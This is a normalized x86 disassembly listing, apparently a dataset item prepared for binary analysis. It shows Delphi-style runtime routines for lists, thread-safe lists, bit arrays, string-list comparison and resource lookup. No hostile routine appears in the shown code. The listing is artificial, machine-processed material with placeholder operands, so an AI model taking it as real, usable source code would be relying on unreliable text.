mov edx esi
mov eax [ rw-data ]
call sub_4136e4
sub_41338c
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_413840
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4133cc
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_41338c
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_4133f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_40442c
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_415d10
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_415810
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403234
retn
sub_413474
push ebx
call sub_405cd8
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_405cd8
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_4136e4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov ebx eax
call sub_405cd8
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov ebx eax
call sub_405cd8
mov [ eax + 0xc ] ebx
sub_4134cc
push ebx
push esi
push edi
call sub_405cd8
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_413840
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_4134fc
push ebx
push esi
call sub_405cd8
mov eax [ eax + 0x8 ]
call sub_403234
call sub_405cd8
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_413928
mov esi eax
call sub_405cd8
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_413730
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_405cd8
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_403234
sub_413558
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4135f5
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4031c0
call sub_413558
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403184
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041d0
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_404f88
call sub_404fd8
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_4133f0
or bl al
sub_413600
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_40317c
call sub_413558
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_413474
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413696
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_4134cc
retn
call sub_4134fc
sub_4136c2
add [ eax ] al
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_4136e4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413730
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4137cc
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028b8
mov edx esi
mov eax ebx
call sub_413840
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413794
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_413790
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2dc
jmp sub_4039a8
sub_4137cc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405a6c
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_413794
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41381b
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_413840
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4137cc
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_413868
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_4139a4
retn
sub_41389c
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_4138bc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4137cc
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028b8
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413934
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4137cc
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413984
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41389c
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_413730
sub_4139a4
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4137cc
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_4026fc
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_4139e0
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4137cc
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_4139a4
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402c40
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_413730
dec ebp
inc edi
jne r-xdata
sub_413a54
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403204
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_413aa8
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035a8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413bac
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_403234
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403224
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413b11
mov eax [ ebp - 0x4 ]
call sub_413c10
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_413b24
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413bac
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4136e4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41389c
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413ba7
mov eax [ ebp - 0x4 ]
call sub_413c10
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_4137cc
sub_413bc0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413bac
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413984
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413c0a
mov eax [ ebp - 0x4 ]
call sub_413c10
retn
sub_413c1c
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_413c70
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_413c70
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_413c4c
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026bc
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402c40
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_4026dc
mov edx edi
mov eax ebp
call sub_413c64
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028b8
sub_413d14
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_413c4c
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_413c70
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_413d40
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_413db8
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
call sub_4164b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_413df8
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404004
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403184
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041d0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403184
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b398
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413eb5
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_413ed4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403184
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_4041d0
mov eax ebx
mov si 0xffff
call sub_403430
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413f70
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax ebx
mov si 0xffff
call sub_403430
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403430
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_4042ec
sub_413f7b
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403470
mov eax ebx
mov si 0xffff
call sub_403430
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403430
push eax
lea eax [ ebx + 0x4 ]
call sub_4055a8
mov ecx eax
mov edx r-xdata
pop eax
call sub_4032e8
sub_413fd8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_413ff8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_414018
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4032e8
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_414040
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_414060
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_413928
call sub_403234
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_4140c8
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_414c20
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413db8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_4140f8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41411c
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_414140
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414290
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4141d1
mov eax [ ebp - 0x4 ]
call sub_41434c
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_4141f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_413de4
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_414290
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41434c
retn
sub_4142a8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_414360
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_414300
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_414ab8
mov eax [ ebp - 0x8 ]
push eax
push sub_414d68
push ebp
call sub_4142a8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414360
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4143fc
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f90
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_404378
jne r-xdata
sub_41440c
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_414408
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2dc
jmp sub_4039a8
sub_414444
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405a6c
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_41440c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414493
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_41449c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414290
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414559
mov eax [ ebp - 0x4 ]
call sub_41434c
retn
sub_414590
push ebp
